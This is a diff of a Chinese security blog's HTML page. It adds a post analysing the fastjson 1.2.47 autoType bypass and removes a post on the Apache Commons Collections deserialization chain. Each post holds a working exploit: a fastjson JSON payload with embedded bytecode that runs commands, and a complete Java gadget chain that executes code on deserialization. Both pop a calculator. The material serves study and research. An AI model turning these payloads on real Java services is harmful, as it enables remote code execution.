@@ -317,6 +317,180 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/fastjson1-2-47反序列化分析/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/fastjson1-2-47反序列化分析/index.html" itemprop="url">
+                  fastjson1.2.47反序列化分析
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-09-27 20:41:19 / Modified: 21:35:12" itemprop="dateCreated datePublished" datetime="2019-09-27T20:41:19+08:00">2019-09-27</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>我司的业务很少用到java所以之前这个漏洞爆出的时候并没有分析，最近想学一下java安全所以也顺便填一下这个坑。</p>
+<h3 id="fastjson-1-2-47-autoType-处理机制"><a href="#fastjson-1-2-47-autoType-处理机制" class="headerlink" title="fastjson 1.2.47 autoType 处理机制"></a>fastjson 1.2.47 autoType 处理机制</h3><p>查看<code>PaserConfig.checkAutoType</code>方法，此方法主要实现类型检验：</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927201030694_kdpl4p.png" alt></p>
+<p>typeName的长度介于128与3之间会运行一系列的哈希计算，计算出哈希之后开始判断autoType</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569588493/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%888.47.48_d7hdsh.png" alt></p>
+<p>这里我们可以看到当autoType开启时fastjson会判断这个哈希是否在<code>denyHashCodes</code>中，如果在就会报错。因此也有人fuzz得到了一些黑名单中的类<a href="https://github.com/LeadroyaL/fastjson-blacklist。">https://github.com/LeadroyaL/fastjson-blacklist。</a></p>
+<p>如果autoType没有开启fastjson则会进行如下判断</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569589016/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%888.56.20_tazxis.png" alt></p>
+<p>从TypeUtils的缓存中寻找该类，或者从反序列化表也即白名单中寻找该类。这次的漏洞便是处在TypeUtils建立的缓存中。</p>
+<h2 id="从payload执行过程分析绕过原因"><a href="#从payload执行过程分析绕过原因" class="headerlink" title="从payload执行过程分析绕过原因"></a>从payload执行过程分析绕过原因</h2><p>这次我是用的payload是<code>templateImpl</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"a"</span>:&#123;</span><br><span class="line">  <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">  <span class="string">"val"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span></span><br><span class="line">	&#125;,</span><br><span class="line">  <span class="string">"b"</span>:&#123;</span><br><span class="line">    <span class="string">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,</span><br><span class="line">    <span class="string">"_bytecodes"</span>:[<span class="string">"yv66vgAAADMAOQoACQApCgAqACsIACwKACoALQcALgoABQApCAAvBwAwBwAxAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABVMSmF2YVVuc2VyL1NoZWxsRXhlYzsBAApFeGNlcHRpb25zBwAyAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAzAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHADABAApTb3VyY2VGaWxlAQAOU2hlbGxFeGVjLmphdmEMAAoACwcANAwANQA2AQASb3BlbiAtYSBDYWxjdWxhdG9yDAA3ADgBABNKYXZhVW5zZXIvU2hlbGxFeGVjAQARdG91Y2ggL3RtcC9uaW1hZGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAJAAAAAAAFAAEACgALAAIADAAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgANAAAADgADAAAAEwAEABQADQAVAA4AAAAMAAEAAAAOAA8AEAAAABEAAAAEAAEAEgABABMAFAABAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAGAAOAAAAKgAEAAAAAQAPABAAAAAAAAEAFQAWAAEAAAABABcAGAACAAAAAQAZABoAAwABABMAGwACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAGwAOAAAAIAADAAAAAQAPABAAAAAAAAEAFQAWAAEAAAABABwAHQACABEAAAAEAAEAHgAJAB8AIAACAAwAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAA0AAAAKAAIAAAAeAAgAHwAOAAAAFgACAAAACQAhACIAAAAIAAEAIwAQAAEAEQAAAAQAAQAIAAgAJAALAAEADAAAAE8AAgABAAAADrgAAhIHtgAEV6cABEuxAAEAAAAJAAwACAADAA0AAAASAAQAAAAOAAkAEQAMAA8ADQASAA4AAAACAAAAJQAAAAcAAkwHACYAAAEAJwAAAAIAKA=="</span>],</span><br><span class="line">    <span class="string">"_name"</span>:<span class="string">"a.b"</span>,</span><br><span class="line">    <span class="string">"_tfactory"</span>:&#123; &#125;,</span><br><span class="line">    <span class="string">"_outputProperties"</span>:&#123; &#125;,</span><br><span class="line">    <span class="string">"_name"</span>:<span class="string">"a"</span>,</span><br><span class="line">    <span class="string">"_version"</span>:<span class="string">"1.0"</span>,</span><br><span class="line">    <span class="string">"allowedProtocols"</span>:<span class="string">"all"</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>IDEA启动调试看一下为什么这个payload能绕过autoType限制。</p>
+<p>反序列化流程的主要出发点在</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927200913202_aozcaz.png" alt></p>
+<p>我们跟进<code>DefaultJSONParser.parse</code>方法，开始是很多的lexer解析相关的操作。直接跳到对key为<code>@type</code>的处理</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927200935201_jr8iiv.png" alt></p>
+<p>这里走到了我们之前提到的checkAutoType的操作，此时我们的类型为<code>java.lang.Class</code>，跟进checkAutoType分析，首先会进入<code>TypeUtils.getClassFromMapping</code>中看此类是否存在于我们的缓存类中。我们可以下断点看一下缓存类中都有哪些东西</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587949/blog/fastjson/image-20190927201159172_ev8tqm.png" alt></p>
+<p>这个map中并没有我们想要的<code>java.lang.Class</code>,且此时也没有我们想要的<code>templatesImpl</code>类。</p>
+<p>继续跟进可以看到<code>java.lang.Class</code>正在<code>ParseConfig.deserializers</code>中</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569589961/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%889.11.53_xxsi8l.png" alt></p>
+<p>因此我们可以直接得到我们该类型。</p>
+<p>获取类型后继续跟进可以看到会用<code>java.lang.Class</code>的反序列化器即<code>MiscCodec</code>来反序列化<code>java.lang.Class</code>类。</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587946/blog/fastjson/image-20190927201746911_hmmaek.png" alt></p>
+<p>跟进反序列化过程，又是一段很长的编译原理相关的lexer解析过程。解析出来<code>val</code>的键<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587950/blog/fastjson/image-20190927202033346_rdk2n1.png" alt></p>
+<p>之后便进行类的反序列化过程，在判断了是否为一些类之后进入如下分支</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587951/blog/fastjson/image-20190927203146237_f2rp5f.png" alt></p>
+<p>进入<code>TypeUtils.loadClass</code>方法，可以看到这次会通过classLoader生成类后把<code>TemplatesImpl</code>放到缓存map中</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587949/blog/fastjson/image-20190927202933280_uvpvwn.png" alt></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587949/blog/fastjson/image-20190927203116745_zkznr0.png" alt></p>
+<p>我们想要的类已经进入了mapping。</p>
+<p>之后序列化<code>b</code>时mapping中存在<code>TemplatesImpl</code>类可以返回我们的TemplatesImpl类了,一切操作便像之前的反序列化漏洞相同了，通过<code>JavaBeanDeserializer.deserialze</code>来调用TemplatesImpl类的setXXX方法来RCE.可以参考<a href="http://hexo.imagemlt.xyz/post/java-unserialize-learning-3/index.html">http://hexo.imagemlt.xyz/post/java-unserialize-learning-3/index.html</a>.</p>
+<p>最后放个弹计算器的图片来结束这篇文章。web安全虽然入门容易，但是要成为跟orange等大牛一样厉害的国际大黑客还是需要学很多很多。</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569591291/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%889.34.32_halujx.png" alt></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/XNUCA-qualifier-md/index.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2060,191 +2234,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/apache-common-collections/index.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/apache-common-collections/index.html" itemprop="url">
-                  java apache common collections 反序列化分析
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-06 10:59:25" itemprop="dateCreated datePublished" datetime="2019-02-06T10:59:25+08:00">2019-02-06</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-03-22 08:33:22" itemprop="dateModified" datetime="2019-03-22T08:33:22+08:00">2019-03-22</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>打包发布于安全客<a href="https://www.anquanke.com/post/id/173459">https://www.anquanke.com/post/id/173459</a></p>
-</blockquote>
-<h1 id="java-apache-common-collections-反序列化分析"><a href="#java-apache-common-collections-反序列化分析" class="headerlink" title="java apache common collections 反序列化分析"></a>java apache common collections 反序列化分析</h1><p>apache common collections是15年左右爆出来的一个反序列化利用链，影响范围广泛。这篇文章中便复现一下这个利用过程。</p>
-<h2 id="复现的第一步：项目依赖项配置"><a href="#复现的第一步：项目依赖项配置" class="headerlink" title="复现的第一步：项目依赖项配置"></a>复现的第一步：项目依赖项配置</h2><p>新版本的apache common collections添加了对这个漏洞的修复，在<code>apache common collections4</code>中Tranformer类取消了<code>Seralizable</code>,而其他高版本则需要设置环境来允许序列化才可以，因此我们使用旧版本的apache common collections来复现这个漏洞。这里贴一下我的maven的依赖项配置：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="pop链分析"><a href="#pop链分析" class="headerlink" title="pop链分析"></a>pop链分析</h2><p>apache common collections的反序列化主要依托于transformer这个类，以及TransformedMap类。顾名思义Transformer类适用于描述一个变换过程，而TransformedMap就是将这个变换过程应用到一个Map上对Map进行变换。当我们修改Map中的某个值时就会调用预先设置好的Transformer来对Map进行处理操作。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map transformedMap=TransformedMap.decorate(map,keyTrasnfomer,valueTransformer);</span><br></pre></td></tr></table></figure>
-<p>这里便通过一个decorate函数将一个map转换为TranformedMap,并对map的key和value绑定相应的Transformer,当<code>key</code>和<code>value</code>改变时便触发对应的<code>Transformer</code>的<code>transform</code>方法进行处理动作。</p>
-<p>如果想要实现一连串的变换操作则可以通过ChainedTransformer来实现,比如这里我们用于实现RCE的Tranformer链：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                由于Method类的invoke(Object obj,Object args[])方法的定义</span></span><br><span class="line"><span class="comment">                所以在反射内写new Class[] &#123;Object.class, Object[].class &#125;</span></span><br><span class="line"><span class="comment">                正常POC流程举例：</span></span><br><span class="line"><span class="comment">                ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class,Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">null</span> &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123; <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span> &#125; <span class="comment">//目标机器上反序列化后执行的命令</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">Transformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
-<p>实际执行的代码便是<code>((Runtime) Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)</code></p>
-<p>也就是Mac下弹计算器的指令。</p>
-<p>之后我们便可以构造一个是哟很难过这个chain的TranformedMap，并且触发对这个TransformedMap的处理即可：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"a"</span>,<span class="string">"b"</span>);</span><br><span class="line">Map transformedMap=TransformedMap.decorate(map,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line">transformedMap.put(<span class="string">"a"</span>,<span class="string">"z"</span>);</span><br></pre></td></tr></table></figure>
-<p>执行即可发现弹回的计算器。</p>
-<p><img src="/post/apache-common-collections/F0D6679D-9008-4677-84C4-0B76725033AF.png" alt="F0D6679D-9008-4677-84C4-0B76725033AF"></p>
-<h2 id="RCE构造"><a href="#RCE构造" class="headerlink" title="RCE构造"></a>RCE构造</h2><p>我们已经构造出了执行命令的popChain,那样怎样才能找到一个符合条件的RCE?我们需要找到一个满足下列条件的类:</p>
-<ul>
-<li>重写了<code>readObject</code>方法</li>
-<li>在readObject方法中存在对一个可控的map进行修改的过程</li>
-</ul>
-<p>之前的很多文章都是使用的<code>AnnotationInvocationHandler</code>类,然而在我使用的jdk版本(1.8)中该类的<code>readObject</code>方法中并没有找到对map的更改操作。后来参考反序列化自动化工具<code>ysoserial</code>中的<code>CommonsCollections5</code>这个payload实现了其中的一个调用链：利用<code>BadAttributeValueExpException</code>类。我们可以看一下这个类的readObject方法：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到这里我们对反序列化传入的对象的成员属性val判断其类型，如果这个变量不是String便会调用val的toString方法。这里如果我们通过反序列化传入的val是一个lazyMap类的entry，在调用其toString方法时便会调用LazyMap.get()从而触发绑定的Transformer的<code>transform</code>方法。但是这里我们的<code>LazyMap</code>类在获取一个不存在的键的时候才会触发<code>transform</code>，因此我们这里可以引入另外一个类<code>TiedMapEntry</code>,这个类在执行toString时可以调用其绑定的map取获取预定的键。</p>
-<p>因此这个poc链的执行过程为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAtrributeValueException对象exception  -&gt;</span><br><span class="line">exception对象的val设置为lazyMap的TiedMapEntry,键为lazyMap中不存在的键 -&gt;</span><br><span class="line">调用entry的toString() -&gt;</span><br><span class="line">调用lazyMap的get方法获取这个不存在的键 -&gt;</span><br><span class="line">调用transform方法</span><br></pre></td></tr></table></figure>
-<p>具体实现：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">/*Map map=new HashMap();</span></span><br><span class="line"><span class="comment">        map.put("a","b");</span></span><br><span class="line"><span class="comment">        Map transformedMap=TransformedMap.decorate(map,null,chainedTransformer);</span></span><br><span class="line"><span class="comment">        transformedMap.put("a","z");</span></span><br><span class="line"><span class="comment">        System.exit(1);*/</span></span><br><span class="line">Map normalMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">normalMap.put(<span class="string">"hackedby"</span>,<span class="string">"imagemlt"</span>);</span><br><span class="line">Map lazyMap=LazyMap.decorate(normalMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">TiedMapEntry entry=<span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">BadAttributeValueExpException exception=<span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valField=exception.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valField.set(exception,entry);</span><br><span class="line"></span><br><span class="line">File f=<span class="keyword">new</span> File(<span class="string">"/tmp/payload.bin"</span>);</span><br><span class="line">ObjectOutputStream out=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">out.writeObject(exception);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line">ObjectInputStream in=<span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(f));</span><br><span class="line">in.readObject();</span><br></pre></td></tr></table></figure>
-<p><img src="/post/apache-common-collections/image-20190206104745142.png" alt="image-20190206104745142"></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这种利用一个Map的pop链就可以让我们想起php的phar反序列化的分析paper中作者挖掘的wordpress的反序列化漏洞也用到了一个类似的对数组进行操作的iterator类，这种利用遍历操作或者绑定动作的操作也可以作为一种分析反序列化漏洞寻找pop链的思路。</p>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.freebuf.com/vuls/175252.html">https://www.freebuf.com/vuls/175252.html</a></p>
-<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
-<p><a href="http://pirogue.org/2017/12/22/javaSerialKiller/">http://pirogue.org/2017/12/22/javaSerialKiller/</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
